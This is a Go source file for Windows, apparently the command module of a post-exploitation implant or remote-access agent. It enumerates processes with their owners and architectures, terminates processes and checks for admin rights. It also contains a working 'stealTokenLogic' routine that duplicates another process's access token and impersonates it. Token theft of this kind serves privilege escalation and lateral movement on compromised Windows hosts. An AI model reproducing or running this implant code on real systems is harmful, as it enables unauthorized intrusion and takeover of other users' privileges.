//go:build windows

package command

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	modadvapi32                 = syscall.NewLazyDLL("advapi32.dll")
	procOpenProcessToken        = modadvapi32.NewProc("OpenProcessToken")
	procDuplicateTokenEx        = modadvapi32.NewProc("DuplicateTokenEx")
	procSetThreadToken          = modadvapi32.NewProc("SetThreadToken")
	procImpersonateLoggedOnUser = modadvapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf            = modadvapi32.NewProc("RevertToSelf")

	modntdll                      = syscall.NewLazyDLL("ntdll.dll")
	procNtQueryInformationProcess = modntdll.NewProc("NtQueryInformationProcess")

	// modkernel32 已经在 fs_ops_windows.go 中声明
	procQueryFullProcessImageNameW = modkernel32.NewProc("QueryFullProcessImageNameW")
	procIsWow64Process             = modkernel32.NewProc("IsWow64Process")
	procIsWow64Process2            = modkernel32.NewProc("IsWow64Process2") // Win10 1709+, 用于 arm64 检测
	procProcessIdToSessionId       = modkernel32.NewProc("ProcessIdToSessionId")

	procGetTokenInformation = modadvapi32.NewProc("GetTokenInformation")
	procLookupAccountSidW   = modadvapi32.NewProc("LookupAccountSidW")
)

const (
	TH32CS_SNAPPROCESS                = 0x00000002
	PROCESS_ALL_ACCESS                = 0x1F0FFF
	PROCESS_QUERY_INFORMATION         = 0x0400
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	TOKEN_DUPLICATE                   = 0x0002
	TOKEN_QUERY                       = 0x0008
	TokenUser                         = 1
	TokenImpersonation                = 2
	SecurityImpersonation             = 2
)

// PE machine type 常量（用于 IsWow64Process2）
const (
	imageFileMachineUnknown = 0x0000 // 原生进程
	imageFileMachineI386    = 0x014C // Intel 386
	imageFileMachineAmd64   = 0x8664 // AMD64
	imageFileMachineArm64   = 0xAA64 // ARM64
)

type PROCESSENTRY32 struct {
	Size            uint32
	Usage           uint32
	ProcessID       uint32
	DefaultHeapID   uintptr
	ModuleID        uint32
	Threads         uint32
	ParentProcessID uint32
	PriClassBase    int32
	Flags           uint32
	ExeFile         [260]uint16
}

func listProcesses(acp int) ([]ProcessInfo, error) {
	snapshot, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer syscall.CloseHandle(snapshot)

	var entry PROCESSENTRY32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = syscall.Process32First(snapshot, (*syscall.ProcessEntry32)(unsafe.Pointer(&entry)))
	if err != nil {
		return nil, err
	}

	results := make([]ProcessInfo, 0)

	for {
		pid := entry.ProcessID
		ppid := entry.ParentProcessID
		name := syscall.UTF16ToString(entry.ExeFile[:])

		path := getProcessPath(pid)
		user := getProcessUser(pid)
		arch := getProcessArch(pid)

		var sessionID uint32
		procProcessIdToSessionId.Call(uintptr(pid), uintptr(unsafe.Pointer(&sessionID)))

		results = append(results, ProcessInfo{
			PID:       pid,
			PPID:      ppid,
			Name:      name,
			Path:      path,
			User:      user,
			Arch:      int32(arch),
			SessionID: sessionID,
		})

		err = syscall.Process32Next(snapshot, (*syscall.ProcessEntry32)(unsafe.Pointer(&entry)))
		if err != nil {
			break
		}
	}

	return results, nil
}

func getProcessPath(pid uint32) string {
	h, err := syscall.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return ""
	}
	defer syscall.CloseHandle(h)

	buf := make([]uint16, syscall.MAX_PATH)
	size := uint32(len(buf))
	r, _, _ := procQueryFullProcessImageNameW.Call(uintptr(h), 0, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)))
	if r == 0 {
		return ""
	}
	return syscall.UTF16ToString(buf[:size])
}

func getProcessUser(pid uint32) string {
	h, err := syscall.OpenProcess(PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return ""
	}
	defer syscall.CloseHandle(h)

	var hToken syscall.Token
	r, _, _ := procOpenProcessToken.Call(uintptr(h), TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
	if r == 0 {
		return ""
	}
	defer hToken.Close()

	// 获取 TokenUser 信息所需长度
	var n uint32
	procGetTokenInformation.Call(uintptr(hToken), TokenUser, 0, 0, uintptr(unsafe.Pointer(&n)))
	if n == 0 {
		return ""
	}

	buf := make([]byte, n)
	r, _, _ = procGetTokenInformation.Call(uintptr(hToken), TokenUser, uintptr(unsafe.Pointer(&buf[0])), uintptr(n), uintptr(unsafe.Pointer(&n)))
	if r == 0 {
		return ""
	}

	tokenUser := (*syscall.Tokenuser)(unsafe.Pointer(&buf[0]))

	// 查找 SID 对应的用户名和域名
	nameBuf := make([]uint16, 256)
	domainBuf := make([]uint16, 256)
	nameLen := uint32(len(nameBuf))
	domainLen := uint32(len(domainBuf))
	var use uint32

	r, _, _ = procLookupAccountSidW.Call(
		0,
		uintptr(unsafe.Pointer(tokenUser.User.Sid)),
		uintptr(unsafe.Pointer(&nameBuf[0])),
		uintptr(unsafe.Pointer(&nameLen)),
		uintptr(unsafe.Pointer(&domainBuf[0])),
		uintptr(unsafe.Pointer(&domainLen)),
		uintptr(unsafe.Pointer(&use)),
	)
	if r == 0 {
		return ""
	}

	return fmt.Sprintf("%s\\%s", syscall.UTF16ToString(domainBuf), syscall.UTF16ToString(nameBuf))
}

func getProcessArch(pid uint32) int {
	h, err := syscall.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return 1 // 默认 64 位
	}
	defer syscall.CloseHandle(h)

	// 优先使用 IsWow64Process2（Win10 1709+），支持 arm64 检测
	var processMachine, nativeMachine uint16
	r, _, _ := procIsWow64Process2.Call(
		uintptr(h),
		uintptr(unsafe.Pointer(&processMachine)),
		uintptr(unsafe.Pointer(&nativeMachine)),
	)
	if r != 0 {
		// IsWow64Process2 成功
		if processMachine == imageFileMachineUnknown {
			// 原生进程，检查 nativeMachine
			switch nativeMachine {
			case imageFileMachineArm64:
				return 2 // arm64
			case imageFileMachineAmd64:
				return 1 // x64
			default:
				return 1
			}
		}
		// 仿真/转译进程
		switch processMachine {
		case imageFileMachineI386:
			return 0 // x86（x86 on x64/arm64）
		case imageFileMachineAmd64:
			return 1 // x64（x64 on arm64）
		default:
			return 1
		}
	}

	// 回退：IsWow64Process2 不存在（老系统），使用 IsWow64Process
	var isWow64 int32
	r, _, _ = procIsWow64Process.Call(uintptr(h), uintptr(unsafe.Pointer(&isWow64)))
	if r == 0 {
		return 1
	}
	if isWow64 != 0 {
		return 0 // x86
	}
	return 1 // x64
}

func terminateProcess(pid int) (string, error) {
	h, err := syscall.OpenProcess(syscall.PROCESS_TERMINATE, false, uint32(pid))
	if err != nil {
		return "", err
	}
	defer syscall.CloseHandle(h)

	err = syscall.TerminateProcess(h, 0)
	if err != nil {
		return "", err
	}

	return "Process terminated", nil
}

func stealTokenLogic(pid int) (string, error) {
	hProcess, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return "", fmt.Errorf("OpenProcess error: %v", err)
	}
	defer syscall.CloseHandle(hProcess)

	var hToken syscall.Token
	r1, _, err := procOpenProcessToken.Call(uintptr(hProcess), TOKEN_DUPLICATE|TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
	if r1 == 0 {
		return "", fmt.Errorf("OpenProcessToken error: %v", err)
	}
	defer hToken.Close()

	var hNewToken syscall.Token
	r1, _, err = procDuplicateTokenEx.Call(
		uintptr(hToken),
		0x02000000, // MAXIMUM_ALLOWED
		0,
		SecurityImpersonation,
		TokenImpersonation,
		uintptr(unsafe.Pointer(&hNewToken)),
	)
	if r1 == 0 {
		return "", fmt.Errorf("DuplicateTokenEx error: %v", err)
	}
	defer hNewToken.Close()

	r1, _, err = procImpersonateLoggedOnUser.Call(uintptr(hNewToken))
	if r1 == 0 {
		return "", fmt.Errorf("ImpersonateLoggedOnUser error: %v", err)
	}

	return "Successfully stole token", nil
}

func whoamiLogic() (string, error) {
	user := getProcessUser(uint32(syscall.Getpid()))
	if user == "" {
		return "unknown", nil
	}

	// 还可以增加权限检查逻辑 (IsAdmin)
	isAdmin := checkIsAdmin()
	status := "User"
	if isAdmin {
		status = "Admin"
	}

	return fmt.Sprintf("%s (%s)", user, status), nil
}

// 借用 sysinfo 中的逻辑，或者在此本地实现
func checkIsAdmin() bool {
	// 尝试打开物理驱动器是一个简单有效的权限检测方法
	h, err := syscall.Open("\\\\.\\PHYSICALDRIVE0", syscall.O_RDONLY, 0)
	if err != nil {
		return false
	}
	syscall.CloseHandle(h)
	return true
}
